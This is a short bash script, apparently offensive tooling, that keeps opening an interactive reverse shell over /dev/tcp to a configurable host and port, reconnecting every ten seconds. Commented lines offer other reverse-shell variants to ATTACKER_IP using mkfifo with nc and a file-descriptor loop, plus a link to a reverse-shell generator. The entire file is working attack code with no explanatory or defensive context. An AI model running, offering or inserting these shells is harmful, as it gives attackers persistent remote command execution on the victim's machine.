#!/bin/bash

RHOST="127.0.0.1"
RPORT=4444

while true; do
    bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
    sleep 10
done


# other shells (need to setup)
# mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
# exec 5<>/dev/tcp/ATTACKER_IP/PORT
# cat <&5 | while read line; do $line 2>&5 >&5; done
# more from https://www.revshells.com/
